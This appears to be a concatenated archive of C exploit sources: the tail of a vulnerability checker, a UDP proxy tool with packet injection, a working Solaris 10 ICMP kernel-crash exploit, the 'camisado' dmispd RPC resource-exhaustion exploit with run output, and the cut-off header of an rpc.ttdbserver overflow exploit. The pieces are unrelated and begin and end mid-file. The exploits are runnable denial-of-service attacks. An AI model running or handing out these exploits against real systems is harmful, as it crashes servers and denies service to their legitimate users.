    *(u_int *)(info + 3) = ~time(NULL);
    SEND(info, sizeof(info));
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }
    close(sd);
    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz) {
    int     i,
            len;

    for(i = 3; i; i--) {        
        SEND(in, insz);
        if(!timeout(sd)) break;
    }
    if(!i) return(-1);

    RECV(out, outsz);
    return(len);
}



void show_info(u_char *data, int len) {
    int     nt = 0,
            d;
    u_char  *limit = data + len;

    for(data += 5; data < limit; data += d + 1, nt++) {
        d = strlen(data);
        if(nt & 1) {
            printf("%s\n", data);
        } else {
            if(!d) break;
            printf("%30s: ", data);
        }
    }
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2005,2006,2007,2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <ctype.h>
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define LOADDLL         hLib = LoadLibrary(fname);                          \
                            if(!hLib) winerr();
    #define GETFUNC(x,y)    x  = GetProcAddress(hLib, y);                       \
                            if(!x) winerr();
    #define CLOSEDLL        FreeLibrary(hLib);
    HINSTANCE   hLib;

    void winerr(void);
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/time.h>
    #include <dlfcn.h>      // -ldl

    #define WINAPI
    #define LOADDLL         char    *error;                                     \
                            hLib = dlopen(fname, RTLD_LAZY);                    \
                            if(!hLib) {                                         \
                                fprintf(stderr, "\nError: %s\n\n", dlerror());  \
                                exit(1);                                        \
                            }
    #define GETFUNC(x,y)    x  = dlsym(hLib, y);                                \
                            error = dlerror();                                  \
                            if(error || !x) {                                   \
                            fprintf(stderr, "\nError: %s\n\n", error);          \
                                exit(1);                                        \
                            }
    #define CLOSEDLL        dlclose(hLib);
    void        *hLib;
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.3a"
#define BUFFSZ      0xffff
#define DLLINIT     "sudp_init"
#define DLLPCK      "sudp_pck"
#define DLLVIS      "sudp_vis"
#define TIMEOUT     30

#ifndef IP_TOS
    #define IP_TOS 3
#endif



typedef int (WINAPI*_sudp_init)(u8 *);      // initialization
typedef int (WINAPI*_sudp_pck)(u8 *, int);  // modification of the packet
typedef int (WINAPI*_sudp_vis)(u8 *, int);  // modification for visualization only
_sudp_init  sudp_init;
_sudp_pck   sudp_pck;
_sudp_vis   sudp_vis;



FILE *create_acp(u8 *acpfile);
struct clients_struct *check_fd(struct sockaddr_in *peer);
void loaddll(u8 *fname, u8 *par);
int little_endian_num(u8 *data, uint64_t num, int bits);
void acp_dump(FILE *fd, u8 *data, int len, struct sockaddr_in *src, struct sockaddr_in *dst);
u16 in_cksum(void *data, int len);
u32 resolv(char *host);
void std_err(void);



struct clients_struct {
    int     sd;
    struct  sockaddr_in peer;
    time_t  timez;
    struct  clients_struct  *next;
} *clients;

int     quiet = 0;
const static int
        on  = 1,
        tos = 0x10;



int main(int argc, char *argv[]) {
    struct clients_struct   *c,
                            *tmpc;
    struct  sockaddr_in peer,
                        tmpeer,
                        peeri,
                        peerl,
                        *psrc,
                        *pdst;
    struct  in_addr ip;
    struct  timeval tout;
    FILE    *fd      = NULL;
    fd_set  readset;
    int     sdl,
            sdi      = 0,
            i,
            len      = 0,
            sel,
            psz,
            hex      = 0,
            chr,
            everyone = 0,
            priority = 0;
    u16     sport,
            lport,
            inject   = 0;
    u8      *buff,
            *acpfile = NULL,
            *dll     = NULL,
            *dllpar  = NULL;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    fputs("\n"
        "Simple UDP proxy/pipe "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stderr);

    if(argc < 4) {
        printf("\n"
            "Usage: %s [options] <server> <server_port> <local_port>\n"
            "\n"
            "Options:\n"
            "-x       show the hex dump of each packet\n"
            "-a FILE  create an ACP (tcpdump) file in which storing all the packets\n"
            "-b IP    bind only the interface identified with IP\n"
            "-l LIB   load a dll/so which will be used to process all the incoming\n"
            "         packets. The library must contain the following functions:\n"
            "           int sudp_init(u8 *data);          // if you need initialization\n"
            "           int sudp_pck(u8 *data, int len);  // each packet goes here\n"
            "           int sudp_vis(u8 *data, int len);  // for visualization only\n"
            "-L PAR   parameter for the initialization of the above function\n"
            "         if the plugin library supports parameters use -L \"\" for the help\n"
            "-e       forward each packet to anyone (clients and server) except the sender,\n"
            "         it works just like a chat or a broadcaster\n"
            "-i PORT  injection options, listen on the port PORT and each packet received\n"
            "         here is sent to the server from all the connected clients\n"
            "-p       increase process priority\n"
            "-q       quiet output\n"
            "\n", argv[0]);
        exit(1);
    }

    ip.s_addr = INADDR_ANY;

    argc -= 3;
    for(i = 1; i < argc; i++) {
        if(argv[i][0] != '-') continue;
        switch(argv[i][1]) {
            case 'x': hex       = 1;                    break;
            case 'a': acpfile   = argv[++i];            break;
            case 'b': ip.s_addr = resolv(argv[++i]);    break;
            case 'l': dll       = argv[++i];            break;
            case 'L': dllpar    = argv[++i];            break;
            case 'e': everyone  = 1;                    break;
            case 'i': inject    = atoi(argv[++i]);      break;
            case 'p': priority  = 1;                    break;
            case 'q': quiet     = 1;                    break;
            default: {
                fprintf(stderr, "\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

    sport = atoi(argv[argc + 1]);
    lport = atoi(argv[argc + 2]);

    peer.sin_addr.s_addr  = resolv(argv[argc]); /* connect to server */
    peer.sin_port         = htons(sport);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = ip.s_addr;          /* listen for client */
    peerl.sin_port        = htons(lport);
    peerl.sin_family      = AF_INET;

    if(!quiet) {
        printf(
            "- server:   %s : %hu\n"
            "- bind UDP port %hu\n",
            inet_ntoa(peer.sin_addr), sport,
            lport);
    }

    if(priority) {
    #ifdef WIN32
        SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    //    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    #else
        nice(-10);
    #endif
    }

    if(dll) {
        if(!quiet) printf("- load library %s\n", dll);
        loaddll(dll, dllpar);
    }

    if(acpfile) {
        if(!quiet) printf("- create ACP file %s\n", acpfile);
        fd = fopen(acpfile, "rb");
        if(fd) {
            fclose(fd);
            fprintf(stderr, "- do you want to overwrite (Y) or append (A) the file? (y/a/N)\n  ");
            fflush(stdin);
            chr = tolower(fgetc(stdin));
            if(chr == 'a') {
                fd = fopen(acpfile, "ab");
                if(!fd) std_err();
            } else if(chr == 'y') {
                fd = create_acp(acpfile);
            } else {
                return(0);
            }
        } else {
            fd = create_acp(acpfile);
        }
    }

    psrc = &peerl;
    pdst = &peer;

    sdl = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sdl < 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sdl, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in))
      < 0) std_err();
    setsockopt(sdl, IPPROTO_IP, IP_TOS, (char *)&tos, sizeof(tos));

    if(inject) {
        peeri.sin_addr.s_addr = ip.s_addr;      /* listen for injection */
        peeri.sin_port        = htons(inject);
        peeri.sin_family      = AF_INET;

        sdi = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sdi < 0) std_err();
        if(setsockopt(sdi, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
          < 0) std_err();
        if(bind(sdi, (struct sockaddr *)&peeri, sizeof(struct sockaddr_in))
          < 0) std_err();
        setsockopt(sdi, IPPROTO_IP, IP_TOS, (char *)&tos, sizeof(tos));
    }

    printf("- ready\n");
    FD_ZERO(&readset);      // wait first client's packet, this is NEEDED!
    FD_SET(sdl, &readset);
    if(select(sdl + 1, &readset, NULL, NULL, NULL)
      < 0) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    clients = NULL;

    for(;;) {
        FD_ZERO(&readset);
        FD_SET(sdl, &readset);
        sel = sdl;
        if(inject) {
            FD_SET(sdi, &readset);
            if(sdi > sel) sel = sdi;
        }
        for(c = clients; c; c = c->next) {
            FD_SET(c->sd, &readset);
            if(c->sd > sel) sel = c->sd;
        }
        sel++;

        tout.tv_sec  = TIMEOUT;     // this is useful if we want to free memory
        tout.tv_usec = 0;           // ...rarely used but I think it's good here
        chr = select(sel, &readset, NULL, NULL, &tout);
        if(chr < 0) std_err();

        // select seems to be able to return more than one file descriptor but
        // in the real world this happens never (I have tested it many times)

        if(!chr) {
            memset(&tmpeer, 0, sizeof(struct sockaddr_in));
            check_fd(&tmpeer);
            continue;
        }
//        if(select(sel, &readset, NULL, NULL, NULL)    // no timeout method, good too
//          < 0) std_err();

        psz = sizeof(struct sockaddr_in);
        memcpy(&tmpeer, &peerl, sizeof(struct sockaddr_in));

        if(inject) {
            if(FD_ISSET(sdi, &readset)) {
                len = recvfrom(sdi, buff, BUFFSZ, 0, (struct sockaddr *)&tmpeer, &psz);
                if(len < 0) continue;
                if(!quiet) {
                    printf("- packet injection from %s:%hu (%d bytes)\n",
                        inet_ntoa(tmpeer.sin_addr), ntohs(tmpeer.sin_port), len);
                }
                if(hex) {
                    show_dump(buff, len, stdout);
                }
                for(c = clients; c; c = c->next) {
                    sendto(c->sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    sleep(0);   // avoids packets congestion?
                }
                continue;
            }
        }

            /* CLIENTS */
        if(FD_ISSET(sdl, &readset)) {

                // this is the portal where all the clients arrive
            len = recvfrom(sdl, buff, BUFFSZ, 0, (struct sockaddr *)&tmpeer, &psz);
            if(len < 0) continue;

                // here we check if this is a new or existent client
            c = check_fd(&tmpeer);
            if(!c) continue;

            psrc = &c->peer;
            pdst = &peer;
            if(dll) {
                len = sudp_pck(buff, len);      // packets modification
            }

                // sends from the client's socket to the server (peer)
            sendto(c->sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));

            if(everyone) {
                tmpc = c;
                for(c = clients; c; c = c->next) {
                    if(c == tmpc) continue;
                    sendto(sdl, buff, len, 0, (struct sockaddr *)&c->peer, sizeof(struct sockaddr_in));
                    sleep(0);   // avoids packets congestion?
                }
            }

        } else {

            /* SERVER */
            for(c = clients; c; c = c->next) {
                if(FD_ISSET(c->sd, &readset)) {

                        // this is the port where the server sends the data for a specific client
                    len = recvfrom(c->sd, buff, BUFFSZ, 0, (struct sockaddr *)&tmpeer, &psz);
                    if(len < 0) continue;

                    // anti server packet's injection, actually disabled for possible compatibility reasons
                /*
                    if((tmpeer.sin_addr.s_addr != peer.sin_addr.s_addr) || (tmpeer.sin_port != peer.sin_port)) {
                        if(!quiet) {
                            printf("- possible packet injection from %s:%hu\n",
                                inet_ntoa(tmpeer.sin_addr), ntohs(tmpeer.sin_port));
                        }
                        continue;
                    }
                */

                    psrc = &peer;
                    pdst = &c->peer;
                    if(dll) {
                        len = sudp_pck(buff, len);      // packets modification
                    }

                        // send from the receiving port to the specific client
                    sendto(sdl, buff, len, 0, (struct sockaddr *)&c->peer, sizeof(struct sockaddr_in));

                    if(everyone) {
                        tmpc = c;
                        for(c = clients; c; c = c->next) {
                            if(c == tmpc) continue;
                            sendto(sdl, buff, len, 0, (struct sockaddr *)&c->peer, sizeof(struct sockaddr_in));
                            sleep(0);   // avoids packets congestion?
                        }
                    }

                    break;
                }
            }
        }

        if(acpfile) acp_dump(fd, buff, len, psrc, pdst);

        if(dll)     len = sudp_vis(buff, len);

        if(hex) {
            if(!quiet) {
                printf("\n%s:%hu -> ",
                    inet_ntoa(psrc->sin_addr), ntohs(psrc->sin_port));
                printf("%s:%hu\n",
                    inet_ntoa(pdst->sin_addr), ntohs(pdst->sin_port));
            }
            show_dump(buff, len, stdout);
        }
    }

    close(sdl);
    if(inject)  close(sdi);
    if(acpfile) fclose(fd);
    if(dll) {
        CLOSEDLL;
    }
    free(buff);
    return(0);
}



FILE *create_acp(u8 *acpfile) {
    FILE    *fd;
    struct {
        u32     magic;
        u16     version_major;
        u16     version_minor;
        u32     thiszone;
        u32     sigfigs;
        u32     snaplen;
        u32     linktype;
    } acp_head;

    fd = fopen(acpfile, "wb");
    if(!fd) std_err();
    little_endian_num((u8 *)&acp_head.magic,         0xa1b2c3d4, 32);
    little_endian_num((u8 *)&acp_head.version_major, 2,          16);
    little_endian_num((u8 *)&acp_head.version_minor, 4,          16);
    little_endian_num((u8 *)&acp_head.thiszone,      0,          32);
    little_endian_num((u8 *)&acp_head.sigfigs,       0,          32);
    little_endian_num((u8 *)&acp_head.snaplen,       65535,      32);
    little_endian_num((u8 *)&acp_head.linktype,      1,          32);
    fwrite(&acp_head, sizeof(acp_head), 1, fd);
    fflush(fd);
    return(fd);
}



struct clients_struct *check_fd(struct sockaddr_in *peer) {
    struct clients_struct   *c,
                            *tmp,
                            *prev,
                            *ret;
    time_t  curr;
    int     sd;

    curr = time(NULL);
    prev = NULL;
    ret  = NULL;

    for(c = clients; c; ) {
        if((c->peer.sin_addr.s_addr == peer->sin_addr.s_addr) && (c->peer.sin_port == peer->sin_port)) {
            c->timez = curr;
            ret  = c;
            prev = c;
            c    = c->next;

        } else if((curr - c->timez) >= TIMEOUT) {
            if(!quiet) {
                printf("- remove %s:%hu\n",
                    inet_ntoa(c->peer.sin_addr), ntohs(c->peer.sin_port));
            }

            tmp = c->next;
            free(c);
            if(prev) {      // second, third and so on
                prev->next = tmp;
            } else {        // the first only
                clients    = tmp;
            }
            c = tmp;

        } else {
            prev = c;
            c    = c->next;
        }
    }

    if(ret) return(ret);
    if(!peer->sin_addr.s_addr || !peer->sin_port) return(NULL);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) return(NULL);

        // totally useless...
    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on,  sizeof(on));
    setsockopt(sd, IPPROTO_IP, IP_TOS,       (char *)&tos, sizeof(tos));

    c = malloc(sizeof(struct clients_struct));
    if(!c) return(NULL);

    if(prev) {
        prev->next = c;
    } else {
        clients    = c;
    }

    c->sd    = sd;
    memcpy(&c->peer, peer, sizeof(struct sockaddr_in));
    c->timez = curr;
    c->next  = NULL;

    if(!quiet) {
        printf("- add %s:%hu\n",
            inet_ntoa(c->peer.sin_addr), ntohs(c->peer.sin_port));
    }

    return(c);
}




void loaddll(u8 *fname, u8 *par) {
    LOADDLL;

    GETFUNC(sudp_init, DLLINIT);

    GETFUNC(sudp_pck,  DLLPCK);

    GETFUNC(sudp_vis,  DLLVIS);

    if(sudp_init(par)) {
//        printf("\nError: plugin initialization failed\n\n");
        CLOSEDLL
        exit(1);
    }
}



int little_endian_num(u8 *data, uint64_t num, int bits) {
    u8      *p;

    p = data;
    *p++ = num & 0xff;
    if(bits >= 16) {
        *p++ = (num >>  8) & 0xff;
    }
    if(bits >= 32) {
        *p++ = (num >> 16) & 0xff;
        *p++ = (num >> 24) & 0xff;
    }
    if(bits >= 64) {
        *p++ = (num >> 32) & 0xff;
        *p++ = (num >> 40) & 0xff;
        *p++ = (num >> 48) & 0xff;
        *p++ = (num >> 56) & 0xff;
    }
    return(p - data);
}



void acp_dump(FILE *fd, u8 *data, int len, struct sockaddr_in *src, struct sockaddr_in *dst) {
    u8      *pseudobuff;
    const static u8 ethdata[14] =
                    "\x00\x00\x00\x00\x00\x00"  /* dest */
                    "\x00\x00\x00\x00\x00\x00"  /* source */
                    "\x08\x00";                 /* type */
    struct {
        struct timeval  ts;
        u32     caplen;
        u32     len;
    } acp_pck;
    struct {
        u8      ihl_version;
        u8      tos;
        u16     tot_len;
        u16     id;
        u16     frag_off;
        u8      ttl;
        u8      protocol;
        u16     check;
        u32     saddr;
        u32     daddr;
    } ip;
    struct {
        u16     source;
        u16     dest;
        u16     len;
        u16     check;
    } udp;
    struct pseudohdr {
        u32     saddr;
        u32     daddr;
        u8      zero;
        u8      protocol;
        u16     length;
    } *pseudo;

#define IPSZ        sizeof(ip)
#define UDPSZ       sizeof(udp)
#define PSEUDOSZ    sizeof(struct pseudohdr)
#define SIZE        (IPSZ + UDPSZ + len)
#define PSSIZE      (PSEUDOSZ + UDPSZ + len)

#ifdef WIN32
    little_endian_num((u8 *)&acp_pck.ts.tv_sec,  time(NULL),     32);
    little_endian_num((u8 *)&acp_pck.ts.tv_usec, GetTickCount(), 32);
#else
    gettimeofday(&(acp_pck.ts), NULL);
    little_endian_num((u8 *)&acp_pck.ts.tv_sec,  acp_pck.ts.tv_sec,  32);
    little_endian_num((u8 *)&acp_pck.ts.tv_usec, acp_pck.ts.tv_usec, 32);
#endif
    little_endian_num((u8 *)&acp_pck.caplen, sizeof(ethdata) + SIZE, 32);
    little_endian_num((u8 *)&acp_pck.len,    sizeof(ethdata) + SIZE, 32);

    ip.ihl_version   = 0x45;
    ip.tos           = 0;
    ip.tot_len       = htons(SIZE);
    ip.id            = htons(1);
    ip.frag_off      = htons(0);
    ip.ttl           = 128;
    ip.protocol      = IPPROTO_UDP;
    ip.check         = 0;
    ip.saddr         = src->sin_addr.s_addr;
    ip.daddr         = dst->sin_addr.s_addr;
    ip.check         = htons(in_cksum((u8 *)&ip, IPSZ));

    udp.source       = src->sin_port;
    udp.dest         = dst->sin_port;
    udp.check        = 0;
    udp.len          = htons(UDPSZ + len);

    pseudobuff       = malloc(PSSIZE);
    if(!pseudobuff) std_err();
    pseudo           = (struct pseudohdr *)pseudobuff;

    pseudo->saddr    = ip.saddr;
    pseudo->daddr    = ip.daddr;
    pseudo->zero     = 0;
    pseudo->protocol = IPPROTO_UDP;
    pseudo->length   = udp.len;

    memcpy(pseudobuff + PSEUDOSZ, &udp, UDPSZ);
    memcpy(pseudobuff + PSEUDOSZ + UDPSZ, data, len);
    udp.check        = htons(in_cksum(pseudobuff, PSSIZE));

    free(pseudobuff);

    fwrite(&acp_pck, sizeof(acp_pck), 1, fd);
    fwrite(ethdata,  sizeof(ethdata), 1, fd);
    fwrite(&ip,      IPSZ,            1, fd);
    fwrite(&udp,     UDPSZ,           1, fd);
    fwrite(data,     len,             1, fd);
    fflush(fd);

#undef IPSZ
#undef UDPSZ
#undef PSEUDOSZ
#undef SIZE
#undef PSSIZE
}



u16 in_cksum(void *data, int len) {
    u32     sum    = 0;
    int     i      = len >> 1,
            endian = 1; // big endian
    u16     crc,
            *p     = (u16 *)data;

    if(*(char *)&endian) endian = 0;
    while(i--) sum += *p++;
    if(len & 1) sum += *p & (endian ? 0xff00 : 0xff);
    crc = sum = (sum >> 16) + (sum & 0xffff);
    if(sum >>= 16) crc += sum;
    if(!endian) crc = (crc >> 8) | (crc << 8);
    return(~crc);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#else
void winerr(void) {
    char *error;

    if(!FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        GetLastError(),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&error,
        0,
        NULL)) {
        error = strerror(errno);
    }
    printf("\nError: %s\n", error);
    LocalFree(error);
    exit(1);
}
#endif


source: http://www.securityfocus.com/bid/22323/info

Sun Solaris is prone to a remote denial-of-service vulnerability.

A successful attack can trigger a crash in the operating system, leading to a denial-of-service condition for legitimate users.

Solaris 10 is affected by this issue. 

/*
 SunOS 5.10 Remote ICMP Kernel Crash Exploit by kcope
 Null Pointer Dereference in Kernel Space
 Seems to work only if attacked in the same network segment,
 maybe because of firewalls/routers in place.
 
 This seems to be the issue described in bid 22323.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

unsigned char rawData[77] =
{
    0x45, 0xFF, 0x00, 0x4D, 0x0C, 0x52, 0x00, 0x00, 0x7E, 0x01, 0x0C, 0xF2, 0xE0, 0x5A, 0x73, 0x12,
    0xC0, 0xA8, 0x0E, 0x58, 0x08, 0xDE, 0xAE, 0x37, 0x6F, 0x3B, 0x66, 0xA7, 0x60, 0xAA, 0x76, 0xC1,
    0xEC, 0xA7, 0x7D, 0xFA, 0x8A, 0x72, 0x8E, 0xC6, 0xE3, 0xD2, 0x64, 0x13, 0xE7, 0x4D, 0xBC, 0x01,
    0x40, 0x5B, 0x8E, 0x8B, 0xE5, 0xEE, 0x5E, 0x37, 0xDD, 0xC2, 0x54, 0x8E, 0x8D, 0xCE, 0x0C, 0x42,
    0x97, 0xA1, 0x8C, 0x04, 0x8A, 0xC2, 0x6B, 0xAE, 0xE9, 0x2E, 0xFE, 0xD4, 0x4B,
} ;

long resolve(char *host)
{
  struct hostent *hst;
  long addr;

  hst = gethostbyname(host);
  if (hst == NULL)
    return(-1);

  memcpy(&addr, hst->h_addr, hst->h_length);
  memcpy(rawData+16, &addr, sizeof(long));

  return(addr);
}

int main(int argc, char *argv[])
{
  struct sockaddr_in dst;
  long saddr, daddr;
  int s;

  if (argc < 2)
  {
    printf("SunOS 5.10 Remote ICMP Kernel Crash Exploit by kcope\n");
    printf("Usage: %s <dst>\n", *argv);
    return(1);
  }

  daddr = resolve(argv[1]);
  saddr = INADDR_ANY;

  memcpy(rawData+16, &daddr, sizeof(long));
//  memcpy(rawData+12, &saddr, sizeof(long));

  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  printf("Sending ICMP packet: %s\n", argv[1]);

      if (sendto(s,&rawData,77,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        perror("Error sending packet");
        exit(-1);
      }

  return(0);
}

/*
camisado.c
AKA
Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit

Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.24.2009

***************************************************************************************************************
Another long night in ONC RPC fuzzing land...

# uname -a
SunOS unknown 5.10 Generic_139555-08 sun4u sparc SUNW,Ultra-5_10
# svcadm restart dmi
# date;sh stat.sh;date
Thursday, September 24, 2009  1:47:22 AM EDT
 18651 root     3584K 2080K sleep   59    0   0:00:00 0.1% dmispd/1
 18651 root     1047M   50M run      9    0   0:00:00 2.8% dmispd/1
 18651 root     1047M  132M run      0    0   0:00:01 7.2% dmispd/1
 18651 root     1047M  212M run      0    0   0:00:02  11% dmispd/1
 18651 root     1047M  292M run     50    0   0:00:03  15% dmispd/1
 18651 root     1047M  375M run     40    0   0:00:04  19% dmispd/1
 18651 root     1047M  455M run     30    0   0:00:05  23% dmispd/1
 18651 root     1047M  525M run     40    0   0:00:06  26% dmispd/1
 18651 root     1047M  527M run     45    0   0:00:06  25% dmispd/1
 18651 root     1047M  531M run     52    0   0:00:06  25% dmispd/1
 18651 root     1047M  543M run     31    0   0:00:07  26% dmispd/1
 18651 root     1047M  550M run     51    0   0:00:07  26% dmispd/1
 18651 root     1047M  551M run     42    0   0:00:07  25% dmispd/1
 18651 root     1047M  552M sleep   60    0   0:00:07  25% dmispd/1
 18651 root     1047M  553M sleep   60    0   0:00:08  25% dmispd/1
 18651 root     1047M  552M run     43    0   0:00:08  24% dmispd/1
 18651 root     1047M  551M sleep   59    0   0:00:17  14% dmispd/1
 18651 root     1047M  545M sleep   59    0   0:00:17  13% dmispd/1
^CThursday, September 24, 2009  1:48:47 AM EDT
#

And also...

# while true;do ps -AZfl | grep dmispd;sleep 1;done
 0 S   global    root 19477     1   0  40 20        ?    448        ? 13:25:10 ?           0:00 /usr/lib/dmi/dmispd
 0 S   global    root 19479 17588   0  40 20        ?    208        ? 13:35:27 pts/3       0:00 grep dmispd
 0 R   global    root 19477     1   4  89 20        ? 134073          13:25:10 ?           0:01 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1   8  89 20        ? 134073          13:25:10 ?           0:02 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  12  99 20        ? 134073          13:25:10 ?           0:03 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  16  99 20        ? 134073          13:25:10 ?           0:04 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  20  99 20        ? 134073          13:25:10 ?           0:05 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  24  59 20        ? 134073          13:25:10 ?           0:06 /usr/lib/dmi/dmispd
 0 R   global    root 19497 17588   0  44 20        ?    206          13:35:34 pts/3       0:00 grep dmispd
bash: fork: Resource temporarily unavailable
#

linux@ubuntu:~$ ./camisado

Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit
Usage: ./camisado <target>

linux@ubuntu:~$ ./camisado 192.168.0.236

Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit

Consuming Resources @ 192.168.0.236 [P:300598 V:1 F:523]...

--> #1
rpc: RPC: Timed out
--> #2
rpc: RPC: Timed out
--> #3
rpc: RPC: Timed out
--> #4
rpc: RPC: Timed out
--> #5
rpc: RPC: Timed out
--> #6
rpc: RPC: Timed out
--> #7
rpc: RPC: Timed out

Finished. Now your sun server may recover :)

linux@ubuntu:~$

As far as I know, the RPC service "dmispd" is enabled by default on Solaris 10 (SPARC tested). It should render
the server unuseable for ~1-2 minutes. I'm not estatic about that part either. Fun to play with if nothing else.
And, If someone is interested in auditing RPC, this could be a good example to learn from. Learning isn't lame ;)
***************************************************************************************************************
camisado.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <errno.h>

#define PROG_NUM 300598
#define PROG_VER 1
#define DMIPROC_ADDROW 523

#define SIZE 100
#define LOOP 7

int main(int argc, char *argv[])
{

char b[SIZE], *buf, *target = argv[1];
int i, usock = RPC_ANYSOCK;

struct hostent *hp;
struct sockaddr_in us;

struct timeval tm={10, 0};

CLIENT *cli;
enum clnt_stat clnt_stat;

if(argc < 2)
{

     printf("\nSun Solaris 10 RPC dmispd Remote Resource Consumption Exploit\n");
     printf("Usage: %s <target>\n\n", argv[0]);

     return 0;

}

     printf("\nSun Solaris 10 RPC dmispd Remote Resource Consumption Exploit\n");

if((hp = gethostbyname(target)) == NULL)
{

     perror("gethostbyname");
     exit(-1);

}

     memcpy(&us.sin_addr.s_addr, hp->h_addr, 4);

us.sin_family = AF_INET;
us.sin_port   = 0;

if((cli = clntudp_create(&us, PROG_NUM, PROG_VER, tm, &usock)) == (CLIENT *)NULL)
{

     clnt_pcreateerror("clntudp_create");
     exit(-1);

}

cli->cl_auth = authunix_create_default();

     memset(b, 'A', sizeof(b));

buf = b;

     printf("\nConsuming Resources @ %s [P:%d V:%d F:%d]...\n\n", target, PROG_NUM, PROG_VER, DMIPROC_ADDROW);

for(i = 0; i < LOOP; i++)
{

     printf("--> #%d\n", i+1);

clnt_stat = clnt_call(cli, DMIPROC_ADDROW, (xdrproc_t)xdr_wrapstring, (char *)&buf, (xdrproc_t)xdr_wrapstring, (char *)&buf, tm);

if(clnt_stat != RPC_SUCCESS) clnt_perror(cli, "rpc");

}

     printf("\nFinished. Now your sun server may recover :)\n\n"); // restart dmi services to try again

     auth_destroy(cli->cl_auth);
     clnt_destroy(cli);

}
source: http://www.securityfocus.com/bid/811/info

It is possible to crash rpc.ttdbserver by using the old tddbserver buffer overflow exploit. This problem is caused by a NULL pointer being dereferenced when rpc function 15 is called with garbage. You cannot make rpc.ttdbserver execute arbitrary code with this vulnerability. The consequence of this vulnerability being exploited is a denial of service condition (rpc.ttdbserver).

/*
 rpc.ttdbserver remote overflow, apk
 Solaris (tested on SS5 and Ultra 2.5.1)
